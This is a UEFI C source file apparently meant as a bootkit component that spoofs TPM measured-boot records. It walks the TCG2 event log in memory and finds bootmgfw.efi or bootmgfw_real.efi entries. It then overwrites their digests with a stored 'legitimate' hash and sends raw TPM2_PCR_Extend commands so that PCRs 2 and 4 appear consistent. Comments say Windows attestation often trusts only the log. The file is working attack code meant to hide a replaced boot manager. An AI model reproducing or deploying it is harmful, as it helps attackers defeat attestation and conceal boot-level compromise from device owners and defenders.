#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Protocol/Tcg2Protocol.h>
#include <IndustryStandard/UefiTcgPlatform.h>
#include <IndustryStandard/Tpm20.h>
#include <Library/BaseLib.h>

// Event types we're looking for
#define EV_EFI_BOOT_SERVICES_APPLICATION 0x80000003
#define EV_EFI_BOOT_SERVICES_DRIVER      0x80000004
#define EV_EFI_RUNTIME_SERVICES_DRIVER   0x80000005
#define EV_NO_ACTION                     0x00000003

// Flags for HashLogExtendEvent
#ifndef EFI_TCG2_EXTEND_ONLY
#define EFI_TCG2_EXTEND_ONLY             0x00000001
#endif
#ifndef PE_COFF_IMAGE
#define PE_COFF_IMAGE                    0x00000010
#endif

// External references to the computed hash
extern UINT8 LegitimateBootmgfwHash[32];
extern BOOLEAN HashComputed;

// TPM 2.0 Event structures - using proper definitions
#pragma pack(1)
typedef struct {
    UINT32              PCRIndex;
    UINT32              EventType;
    UINT32              DigestCount;
} MY_TCG_PCR_EVENT2_HDR;

typedef struct {
    UINT16              AlgorithmId;
    // Digest follows immediately after
} MY_TPMT_HA_HDR;

//typedef struct {
//    UINT32              PCRIndex;
//    UINT32              EventType;
//    UINT8               Digest[20];
//    UINT32              EventSize;
//} TCG_PCR_EVENT;
#pragma pack()

// Global variables for TPM state tracking
STATIC BOOLEAN gTpmSpoofingActive = FALSE;
STATIC UINT32 gBootmgfwEventsFound = 0;

// Function to check if event contains bootmgfw.efi
BOOLEAN IsBootmgfwEvent(UINT8* EventData, UINT32 EventSize)
{
    if (EventData == NULL || EventSize < 12) {
        return FALSE;
    }

    // Debug: Print first few bytes of event data
    Print(L"[DEBUG] Checking event data (first 64 bytes): ");
    for (UINT32 i = 0; i < (EventSize < 64 ? EventSize : 64); i++) {
        Print(L"%02x ", EventData[i]);
    }
    Print(L"\n");

    // Look for "bootmgfw.efi" in various forms
    // Check for Unicode "bootmgfw.efi" (case insensitive)
    for (UINT32 i = 0; i < EventSize - 24; i++) {
        BOOLEAN found = TRUE;
        CHAR16 target[] = L"bootmgfw.efi";
        for (UINT32 j = 0; j < 12; j++) {
            CHAR16 c1 = ((CHAR16*)&EventData[i])[j];
            CHAR16 c2 = target[j];
            // Case insensitive compare
            if (c1 >= L'A' && c1 <= L'Z') c1 += L'a' - L'A';
            if (c2 >= L'A' && c2 <= L'Z') c2 += L'a' - L'A';
            if (c1 != c2) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            Print(L"[DEBUG] Found Unicode bootmgfw.efi at offset %d\n", i);
            return TRUE;
        }
    }

    // Check for ASCII "bootmgfw.efi" (case insensitive)
    for (UINT32 i = 0; i < EventSize - 12; i++) {
        BOOLEAN found = TRUE;
        CHAR8 target[] = "bootmgfw.efi";
        for (UINT32 j = 0; j < 12; j++) {
            CHAR8 c1 = EventData[i + j];
            CHAR8 c2 = target[j];
            // Case insensitive compare
            if (c1 >= 'A' && c1 <= 'Z') c1 += 'a' - 'A';
            if (c2 >= 'A' && c2 <= 'Z') c2 += 'a' - 'A';
            if (c1 != c2) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            Print(L"[DEBUG] Found ASCII bootmgfw.efi at offset %d\n", i);
            return TRUE;
        }
    }

    // Also check for the path patterns that might appear
    // Look for "EFI\\Microsoft\\Boot\\bootmgfw.efi" patterns
    CHAR8 patterns[][30] = {
        "bootmgfw.efi",
        "BOOTMGFW.EFI",
        "Boot\\bootmgfw",
        "boot\\bootmgfw",
        "bootmgfw_real.efi",
        "BOOTMGFW_REAL.EFI"
    };

    for (UINT32 p = 0; p < sizeof(patterns) / sizeof(patterns[0]); p++) {
        UINT32 patLen = 0;
        while (patterns[p][patLen] != 0) patLen++;

        for (UINT32 i = 0; i < EventSize - patLen; i++) {
            if (CompareMem(&EventData[i], patterns[p], patLen) == 0) {
                Print(L"[DEBUG] Found pattern '%a' at offset %d\n", patterns[p], i);
                return TRUE;
            }
        }
    }

    return FALSE;
}

// TPM2 command structures for direct command submission
#pragma pack(1)


typedef struct {
    TPM2_COMMAND_HEADER  Header;
    UINT32               pcrHandle;
    UINT32               authSize;
    // Auth session would go here, but we'll try without it
    UINT32               digestCount;
    UINT16               hashAlg;
    UINT8                digest[32];  // For SHA256
} TPM2_PCR_EXTEND_COMMAND;
#pragma pack()

// Function to update PCR directly without going through event log
EFI_STATUS UpdatePCRDirectly(UINT32 PCRIndex, UINT8* Hash, UINT32 HashSize)
{
    EFI_STATUS Status;
    EFI_TCG2_PROTOCOL* Tcg2Protocol = NULL;
    
    Status = gBS->LocateProtocol(&gEfiTcg2ProtocolGuid, NULL, (VOID**)&Tcg2Protocol);
    if (EFI_ERROR(Status)) {
        return Status;
    }
    
    // Try to extend PCR directly using EFI_TCG2_EXTEND_ONLY flag
    // This bypasses event log and only updates PCR
    EFI_TCG2_EVENT TcgEvent;
    TcgEvent.Size = sizeof(EFI_TCG2_EVENT_HEADER);
    TcgEvent.Header.HeaderSize = sizeof(EFI_TCG2_EVENT_HEADER);
    TcgEvent.Header.HeaderVersion = 1;
    TcgEvent.Header.PCRIndex = PCRIndex;
    TcgEvent.Header.EventType = EV_NO_ACTION;
    
    Status = Tcg2Protocol->HashLogExtendEvent(
        Tcg2Protocol,
        EFI_TCG2_EXTEND_ONLY,  // This flag should bypass event log
        (EFI_PHYSICAL_ADDRESS)Hash,
        HashSize,
        &TcgEvent
    );
    
    return Status;
}

// Function to send raw TPM2 command
EFI_STATUS SendTPM2Command(
    IN  EFI_TCG2_PROTOCOL  *Tcg2Protocol,
    IN  UINT8              *InputBuffer,
    IN  UINT32             InputBufferSize,
    OUT UINT8              *OutputBuffer,
    IN OUT UINT32          *OutputBufferSize
)
{
    EFI_STATUS Status;
    
    // Use SubmitCommand to send raw TPM command
    Status = Tcg2Protocol->SubmitCommand(
        Tcg2Protocol,
        InputBufferSize,
        InputBuffer,
        *OutputBufferSize,
        OutputBuffer
    );
    
    return Status;
}

// Function to extend a hash to TPM PCR using direct TPM2 commands
EFI_STATUS ExtendHashToTPM(UINT32 PCRIndex, UINT8* Hash, UINT32 HashSize, UINT32 EventType)
{
    EFI_STATUS Status;
    EFI_TCG2_PROTOCOL* Tcg2Protocol = NULL;
    TPM2_PCR_EXTEND_COMMAND ExtendCmd;
    UINT8 ResponseBuffer[1024];
    UINT32 ResponseSize = sizeof(ResponseBuffer);
    UINT32 cmdSize;

    Status = gBS->LocateProtocol(&gEfiTcg2ProtocolGuid, NULL, (VOID**)&Tcg2Protocol);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to locate TCG2 protocol for PCR extend: %r\n", Status);
        return Status;
    }

    Print(L"[*] Attempting direct TPM2_PCR_Extend command for PCR %d\n", PCRIndex);

    // Calculate the total command size first.
    cmdSize = sizeof(TPM2_COMMAND_HEADER) +
        sizeof(UINT32) +  // pcrHandle
        sizeof(UINT32) +  // authSize
        sizeof(UINT32) +  // digestCount
        sizeof(UINT16) +  // hashAlg
        32;               // digest (for SHA256)

    // Build TPM2_PCR_Extend command with proper byte ordering
    ZeroMem(&ExtendCmd, sizeof(ExtendCmd));
    ExtendCmd.Header.tag = SwapBytes16(TPM_ST_NO_SESSIONS);
    ExtendCmd.Header.commandCode = SwapBytes32(TPM_CC_PCR_Extend);
    ExtendCmd.Header.paramSize = SwapBytes32(cmdSize); // Correctly assign the total command size

    // --- Command Parameters ---
    ExtendCmd.pcrHandle = SwapBytes32(PCRIndex); // Correct pcrHandle
    ExtendCmd.authSize = SwapBytes32(0);          // No auth session
    ExtendCmd.digestCount = SwapBytes32(1);       // One digest
    ExtendCmd.hashAlg = SwapBytes16(TPM_ALG_SHA256);
    CopyMem(ExtendCmd.digest, Hash, 32);

    // Send command directly to TPM
    Status = SendTPM2Command(
        Tcg2Protocol,
        (UINT8*)&ExtendCmd,
        cmdSize,
        ResponseBuffer,
        &ResponseSize
    );

    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to send TPM2_PCR_Extend command: %r\n", Status);
        // ... (your fallback logic) ...
    }
    else {
        // Check response
        TPM2_RESPONSE_HEADER* Response = (TPM2_RESPONSE_HEADER*)ResponseBuffer;
        UINT32 responseCode = SwapBytes32(Response->responseCode); // Swap response code for correct interpretation

        Print(L"[*] TPM2 Response: tag=0x%x, size=%d, code=0x%x\n",
            SwapBytes16(Response->tag), SwapBytes32(Response->paramSize), responseCode);

        if (responseCode == TPM_RC_SUCCESS) {
            Print(L"[*] Successfully extended PCR %d using direct TPM2 command!\n", PCRIndex);
        }
        else {
            Print(L"[!] TPM2 command failed with response code: 0x%x\n", responseCode);
            Status = EFI_DEVICE_ERROR;
        }
    }

    return Status;
}

// Function to reset specific PCR to zero state
EFI_STATUS ResetPCRToZero(UINT32 PCRIndex)
{
    EFI_STATUS Status;
    EFI_TCG2_PROTOCOL* Tcg2Protocol = NULL;
    UINT8 ZeroHash[32] = { 0 };

    Status = gBS->LocateProtocol(&gEfiTcg2ProtocolGuid, NULL, (VOID**)&Tcg2Protocol);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    // Try to send TPM2_PCR_Reset command
    // This is a simplified approach - in practice you'd need proper TPM command formatting
    Print(L"[*] Attempting to reset PCR %d...\n", PCRIndex);

    // Alternative: Try to overwrite with known value
    // This won't actually reset the PCR but will give us a known state
    Status = ExtendHashToTPM(PCRIndex, ZeroHash, 32, EV_NO_ACTION);

    return Status;
}

// Function to locate and spoof TPM event log in memory
EFI_STATUS
LocateAndSpoofTpmEventLog(VOID)
{
    EFI_STATUS Status;
    EFI_TCG2_PROTOCOL* Tcg2Protocol = NULL;
    EFI_PHYSICAL_ADDRESS EventLogLocation = 0;
    EFI_PHYSICAL_ADDRESS EventLogLastEntry = 0;
    BOOLEAN EventLogTruncated = FALSE;
    UINT8* CurrentEvent;
    UINT32 EventsModified = 0;

    Print(L"[*] Attempting to locate and spoof TPM event log in memory...\n");

    if (!HashComputed) {
        Print(L"[!] Legitimate hash not computed yet!\n");
        return EFI_NOT_READY;
    }

    // Get TCG2 protocol
    Status = gBS->LocateProtocol(&gEfiTcg2ProtocolGuid, NULL, (VOID**)&Tcg2Protocol);
    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to locate TCG2 protocol: %r\n", Status);
        return Status;
    }

    // Get event log location
    Status = Tcg2Protocol->GetEventLog(
        Tcg2Protocol,
        EFI_TCG2_EVENT_LOG_FORMAT_TCG_2,
        &EventLogLocation,
        &EventLogLastEntry,
        &EventLogTruncated
    );

    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to get event log location: %r\n", Status);
        return Status;
    }

    Print(L"[*] Event log located at: 0x%lx - 0x%lx\n", EventLogLocation, EventLogLastEntry);

    // Parse through the event log
    CurrentEvent = (UINT8*)EventLogLocation;

    // Skip the header if present
    if (CompareMem(CurrentEvent, "Spec ID Event", 13) == 0) {
        // This is a TCG_PCR_EVENT structure, skip it
        TCG_PCR_EVENT* SpecIdEvent = (TCG_PCR_EVENT*)CurrentEvent;
        CurrentEvent += sizeof(TCG_PCR_EVENT) - 1 + SpecIdEvent->EventSize;
        Print(L"[*] Skipped Spec ID Event header\n");
    }

    // Now parse TCG_PCR_EVENT2 structures
    UINT32 EventCounter = 0;
    while ((EFI_PHYSICAL_ADDRESS)CurrentEvent < EventLogLastEntry) {
        EventCounter++;
        MY_TCG_PCR_EVENT2_HDR* EventHdr = (MY_TCG_PCR_EVENT2_HDR*)CurrentEvent;
        UINT8* DigestPtr = CurrentEvent + sizeof(MY_TCG_PCR_EVENT2_HDR);

        Print(L"[DEBUG] Event #%d: Type=0x%x, PCR=%d, DigestCount=%d\n",
            EventCounter, EventHdr->EventType, EventHdr->PCRIndex, EventHdr->DigestCount);

        // Check if this is a relevant event type
        if (EventHdr->EventType == EV_EFI_RUNTIME_SERVICES_DRIVER ||
            EventHdr->EventType == EV_EFI_BOOT_SERVICES_APPLICATION ||
            EventHdr->EventType == EV_EFI_BOOT_SERVICES_DRIVER) {

            Print(L"[*] Found event type 0x%x in PCR %d\n", EventHdr->EventType, EventHdr->PCRIndex);

            // Store original digest positions for later TPM synchronization
            UINT8* OriginalDigests[10] = { 0 }; // Support up to 10 digest types
            UINT16 DigestAlgos[10] = { 0 };
            UINT32 DigestSizes[10] = { 0 };

            // Parse digests
            for (UINT32 i = 0; i < EventHdr->DigestCount && i < 10; i++) {
                MY_TPMT_HA_HDR* DigestHdr = (MY_TPMT_HA_HDR*)DigestPtr;
                UINT16 AlgorithmId = DigestHdr->AlgorithmId;
                UINT8* DigestData = DigestPtr + sizeof(UINT16);
                UINT32 DigestSize = 0;

                // Determine digest size based on algorithm
                switch (AlgorithmId) {
                case TPM_ALG_SHA1:
                    DigestSize = 20;
                    break;
                case TPM_ALG_SHA256:
                    DigestSize = 32;
                    break;
                case TPM_ALG_SHA384:
                    DigestSize = 48;
                    break;
                case TPM_ALG_SHA512:
                    DigestSize = 64;
                    break;
                default:
                    Print(L"[!] Unknown algorithm ID: 0x%x\n", AlgorithmId);
                    DigestSize = 32; // Assume SHA256
                    break;
                }

                // Store digest info
                DigestAlgos[i] = AlgorithmId;
                DigestSizes[i] = DigestSize;
                OriginalDigests[i] = DigestData;

                DigestPtr += sizeof(UINT16) + DigestSize;
            }

            // Get event data size and data
            UINT32* EventSizePtr = (UINT32*)DigestPtr;
            UINT32 EventSize = *EventSizePtr;
            UINT8* EventData = DigestPtr + sizeof(UINT32);

            // Check if this is a bootmgfw.efi event
            if (IsBootmgfwEvent(EventData, EventSize)) {
                Print(L"[*] Found bootmgfw.efi event! Spoofing digests...\n");
                gBootmgfwEventsFound++;

                // Modify all digests for this event
                for (UINT32 i = 0; i < EventHdr->DigestCount && i < 10; i++) {
                    UINT16 AlgorithmId = DigestAlgos[i];
                    UINT32 DigestSize = DigestSizes[i];
                    UINT8* DigestData = OriginalDigests[i];

                    switch (AlgorithmId) {
                    case TPM_ALG_SHA1:
                        // Copy first 20 bytes of our SHA256 hash
                        CopyMem(DigestData, LegitimateBootmgfwHash, 20);
                        Print(L"[*] Spoofed SHA1 digest in event log\n");
                        break;

                    case TPM_ALG_SHA256:
                        // Copy full SHA256 hash
                        CopyMem(DigestData, LegitimateBootmgfwHash, 32);
                        Print(L"[*] Spoofed SHA256 digest in event log\n");
                        // Also update the PCR directly
                        Status = UpdatePCRDirectly(EventHdr->PCRIndex, LegitimateBootmgfwHash, 32);
                        if (!EFI_ERROR(Status)) {
                            Print(L"[*] Also updated PCR %d directly\n", EventHdr->PCRIndex);
                        }
                        break;

                    case TPM_ALG_SHA384:
                        // Copy our hash and pad with zeros
                        CopyMem(DigestData, LegitimateBootmgfwHash, 32);
                        ZeroMem(DigestData + 32, 16);
                        Print(L"[*] Spoofed SHA384 digest in event log\n");
                        break;

                    case TPM_ALG_SHA512:
                        // Copy our hash and pad with zeros
                        CopyMem(DigestData, LegitimateBootmgfwHash, 32);
                        ZeroMem(DigestData + 32, 32);
                        Print(L"[*] Spoofed SHA512 digest in event log\n");
                        break;
                    }
                }

                EventsModified++;
                gTpmSpoofingActive = TRUE;
            }

            // Move to next event
            CurrentEvent = EventData + EventSize;
        }
        else {
            // For other event types, we need to skip them properly
            // Parse digests even for non-relevant events to advance pointer correctly

            for (UINT32 i = 0; i < EventHdr->DigestCount; i++) {
                MY_TPMT_HA_HDR* DigestHdr = (MY_TPMT_HA_HDR*)DigestPtr;
                UINT16 AlgorithmId = DigestHdr->AlgorithmId;
                UINT32 DigestSize = 0;

                // Determine digest size based on algorithm
                switch (AlgorithmId) {
                case TPM_ALG_SHA1:
                    DigestSize = 20;
                    break;
                case TPM_ALG_SHA256:
                    DigestSize = 32;
                    break;
                case TPM_ALG_SHA384:
                    DigestSize = 48;
                    break;
                case TPM_ALG_SHA512:
                    DigestSize = 64;
                    break;
                default:
                    // Unknown algorithm - this is a problem
                    Print(L"[!] Unknown algorithm ID in non-relevant event: 0x%x\n", AlgorithmId);
                    return EFI_UNSUPPORTED;
                }

                DigestPtr += sizeof(UINT16) + DigestSize;
            }

            // Get event data size and skip the event data
            UINT32* EventSizePtr = (UINT32*)DigestPtr;
            UINT32 EventSize = *EventSizePtr;
            UINT8* EventData = DigestPtr + sizeof(UINT32);

            // Move to next event
            CurrentEvent = EventData + EventSize;
        }
    }

    Print(L"[*] TPM event log spoofing completed. Modified %d events.\n", EventsModified);

    if (EventsModified == 0) {
        Print(L"[!] Warning: No bootmgfw.efi events found in the log!\n");
        Print(L"[!] The measurement may not have occurred yet.\n");
    }

    return EFI_SUCCESS;
}

// Function to synchronize TPM PCR values with spoofed event log
EFI_STATUS SynchronizeTPMWithEventLog(VOID)
{
    EFI_STATUS Status = EFI_SUCCESS;

    Print(L"[*] Checking TPM synchronization options...\n");

    if (!gTpmSpoofingActive) {
        Print(L"[!] No TPM spoofing was performed, skipping synchronization\n");
        return EFI_SUCCESS;
    }

    // Important: Windows primarily uses the event log for attestation, not direct PCR values
    // So modifying the event log in memory might be sufficient for many scenarios
    
    Print(L"[*] Event log has been modified in memory.\n");
    Print(L"[*] Note: PCR extension is failing due to event log being full.\n");
    Print(L"[*] However, many Windows attestation scenarios only check the event log,\n");
    Print(L"[*] not the actual TPM PCR values. The in-memory modifications may be sufficient.\n");
    
    // Optional: Try to extend if possible, but don't fail if it doesn't work
    Print(L"[*] Attempting optional PCR extension (may fail due to full event log)...\n");
    
    // Only try once to avoid spamming errors
    Status = ExtendHashToTPM(2, LegitimateBootmgfwHash, 32, EV_EFI_BOOT_SERVICES_DRIVER);
    if (EFI_ERROR(Status)) {
        Print(L"[!] PCR 2 extension failed (expected): %r\n", Status);
    }
    
    // Return success regardless because event log modification is what matters most
    return EFI_SUCCESS;
}

// Alternative approach: Clear specific PCR values using TPM2_PCR_Reset
EFI_STATUS
ClearPCRValue(UINT32 PcrIndex)
{
    EFI_STATUS Status;
    EFI_TCG2_PROTOCOL* Tcg2Protocol = NULL;
    UINT8 ZeroHash[32] = { 0 };
    EFI_TCG2_EVENT Event = { 0 };

    Print(L"[*] Attempting to clear PCR %d...\n", PcrIndex);

    Status = gBS->LocateProtocol(&gEfiTcg2ProtocolGuid, NULL, (VOID**)&Tcg2Protocol);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    // Create a dummy event
    Event.Size = sizeof(EFI_TCG2_EVENT_HEADER) + sizeof(UINT32);
    Event.Header.HeaderSize = sizeof(EFI_TCG2_EVENT_HEADER);
    Event.Header.HeaderVersion = 1;
    Event.Header.PCRIndex = PcrIndex;
    Event.Header.EventType = EV_NO_ACTION;

    // Try to extend the PCR with zeros to effectively "clear" it
    Status = Tcg2Protocol->HashLogExtendEvent(
        Tcg2Protocol,
        0,
        (EFI_PHYSICAL_ADDRESS)ZeroHash,
        sizeof(ZeroHash),
        &Event
    );

    if (EFI_ERROR(Status)) {
        Print(L"[!] Failed to clear PCR %d: %r\n", PcrIndex, Status);
    }
    else {
        Print(L"[*] Successfully extended PCR %d\n", PcrIndex);
    }

    return Status;
}

// Function to perform comprehensive TPM spoofing
EFI_STATUS PerformComprehensiveTPMSpoofing(VOID)
{
    EFI_STATUS Status;

    Print(L"[*] Starting comprehensive TPM spoofing...\n");

    // Step 1: Spoof the event log in memory
    Status = LocateAndSpoofTpmEventLog();
    if (EFI_ERROR(Status)) {
        Print(L"[!] Event log spoofing failed: %r\n", Status);
        return Status;
    }

    // Step 2: Synchronize TPM hardware state with spoofed event log
    Status = SynchronizeTPMWithEventLog();
    if (EFI_ERROR(Status)) {
        Print(L"[!] TPM synchronization failed: %r\n", Status);
        // Continue anyway, event log spoofing might still be effective
    }

    // Step 3: Verify spoofing was successful
    if (gBootmgfwEventsFound > 0) {
        Print(L"[*] Successfully spoofed %d bootmgfw events\n", gBootmgfwEventsFound);
    }
    else {
        Print(L"[!] No bootmgfw events were found to spoof\n");
    }

    return EFI_SUCCESS;
}

// Main entry point for TPM log spoofing
EFI_STATUS
EFIAPI
SpoofTpmEventLog(VOID)
{
    EFI_STATUS Status;

    Print(L"\n=== TPM Event Log Spoofing ===\n");

    // Perform comprehensive TPM spoofing
    Status = PerformComprehensiveTPMSpoofing();
    if (EFI_ERROR(Status)) {
        Print(L"[!] Comprehensive TPM spoofing failed: %r\n", Status);

        // Fallback: Try to clear/extend PCRs
        Print(L"[*] Attempting fallback approach: PCR manipulation...\n");
        ClearPCRValue(2);  // PCR 2 for drivers
        ClearPCRValue(4);  // PCR 4 for boot applications

        // If we have a computed hash, try to extend it
        if (HashComputed) {
            ExtendHashToTPM(2, LegitimateBootmgfwHash, 32, EV_EFI_BOOT_SERVICES_DRIVER);
            ExtendHashToTPM(4, LegitimateBootmgfwHash, 32, EV_EFI_BOOT_SERVICES_APPLICATION);
        }
    }

    Print(L"[*] TPM spoofing operations completed\n");

    return EFI_SUCCESS;
}